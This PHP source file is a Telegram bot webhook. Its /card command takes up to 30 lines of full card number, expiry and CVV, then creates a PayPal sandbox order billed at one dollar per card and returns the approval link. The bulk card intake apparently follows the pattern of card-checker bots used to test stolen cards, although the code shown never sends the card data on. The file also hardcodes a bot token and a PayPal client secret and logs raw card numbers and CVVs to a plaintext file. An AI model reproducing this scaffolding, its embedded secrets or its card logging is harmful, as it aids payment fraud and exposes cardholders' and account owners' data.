<?php
// ================================
// ATIVAR ERROS (para depuração Render)
// ================================
error_reporting(E_ALL);
ini_set('display_errors', 1);

// ================================
// CONFIGURAÇÃO DO BOT
// ================================
$botToken = "7738664119:AAF9OOZhzpdZbt8-OZ0lZLC4yZgIhat_cEo"; // Token do BotFather
$clientId = "AdffUCeEAXTKA8poWBnH2FcKtxKotqw3597I9hnDEUVZjIF1lD2NWUjbhoDNGAxJxSfBUUlAPGLjS82K";
$secret   = "ECSD_2TAkgcLvn_LubRrG0JERnuOQQ2c8sxuA3W0LZ_UCIZXcuQiRLnBFcj0p1zHykmdOtP0ER7JyzYF";
$baseUrl  = "https://api-m.sandbox.paypal.com";

// ================================
// LER UPDATE DO TELEGRAM
// ================================
$update = json_decode(file_get_contents("php://input"), true);

// Log para debug
file_put_contents("log.txt", date('Y-m-d H:i:s') . " - " . json_encode($update) . "\n", FILE_APPEND);

if (!$update) exit;

$message = $update["message"]["text"] ?? "";
$chatId  = $update["message"]["chat"]["id"] ?? null;

if (!$message || !$chatId) exit;

// ================================
// TRATAR COMANDO /card
// ================================
if (strpos($message, "/card") === 0) {

    $cardsText = trim(str_replace("/card", "", $message));
    if (empty($cardsText)) {
        sendMessage($chatId, "❌ Envie os cartões abaixo do comando /card\nExemplo:\n/card\n4066698784649380|07|2028|847");
        exit;
    }

    $cards = array_filter(array_map('trim', explode("\n", $cardsText)));

    // Limite máximo de 30 cartões
    if (count($cards) > 30) {
        sendMessage($chatId, "❌ Máximo permitido: 30 cartões por vez.\nVocê enviou: " . count($cards));
        exit;
    }

    // Validação de formato dos cartões
    foreach ($cards as $card) {
        if (!preg_match('/^\d{13,19}\|\d{2}\|\d{4}\|\d{3,4}$/', $card)) {
            sendMessage($chatId, "❌ Formato inválido detectado:\n$card\nUse:\n4066698784649380|07|2028|847");
            exit;
        }
    }

    $totalCards = count($cards);

    sendMessage($chatId, "✅ Cartões recebidos com sucesso!\nQuantidade: $totalCards\nProcessando...");

    // ================================
    // 1️⃣ GERAR TOKEN OAUTH PAYPAL
    // ================================
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "$baseUrl/v1/oauth2/token",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_USERPWD => "$clientId:$secret",
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => "grant_type=client_credentials",
        CURLOPT_HTTPHEADER => [
            "Accept: application/json",
            "Accept-Language: en_US"
        ]
    ]);

    $tokenRespRaw = curl_exec($ch);
    if ($tokenRespRaw === false) {
        sendMessage($chatId, "Erro CURL TOKEN: " . curl_error($ch));
        exit;
    }
    curl_close($ch);

    $tokenResp = json_decode($tokenRespRaw, true);
    $token = $tokenResp['access_token'] ?? null;
    if (!$token) {
        sendMessage($chatId, "❌ Não foi possível gerar token PayPal.");
        exit;
    }

    // ================================
    // 2️⃣ CRIAR ORDER PAYPAL
    // ================================
    $amount = $totalCards; // 1 USD por cartão
    $orderData = [
        "intent" => "CAPTURE",
        "purchase_units" => [[
            "amount" => [
                "currency_code" => "USD",
                "value" => strval($amount)
            ]
        ]],
        "application_context" => [
            "brand_name" => "Teste Sandbox",
            "landing_page" => "BILLING",
            "user_action" => "PAY_NOW",
            "return_url" => "https://seusite.com/sucesso.php",
            "cancel_url" => "https://seusite.com/cancelado.php"
        ]
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "$baseUrl/v2/checkout/orders",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => [
            "Content-Type: application/json",
            "Authorization: Bearer $token"
        ],
        CURLOPT_POSTFIELDS => json_encode($orderData)
    ]);

    $orderRaw = curl_exec($ch);
    curl_close($ch);

    $order = json_decode($orderRaw, true);
    if (!isset($order['id'])) {
        sendMessage($chatId, "❌ Erro ao criar order PayPal:\n$orderRaw");
        exit;
    }

    // ================================
    // 3️⃣ PEGAR LINK DE APROVAÇÃO
    // ================================
    $approveLink = null;
    foreach ($order['links'] as $link) {
        if ($link['rel'] === 'approve') {
            $approveLink = $link['href'];
            break;
        }
    }

    if (!$approveLink) {
        sendMessage($chatId, "❌ Link de aprovação não encontrado.");
        exit;
    }

    // ================================
    // 4️⃣ ENVIAR LINK PARA O TELEGRAM
    // ================================
    sendMessage($chatId, "✅ Pedido sandbox criado!\nOrder ID: {$order['id']}\nTotal: $amount USD\nAprovar pagamento: $approveLink");
}

// ================================
// FUNÇÃO PARA ENVIAR MENSAGEM TELEGRAM
// ================================
function sendMessage($chatId, $text) {
    global $botToken;
    $text = urlencode($text);
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$text");
}
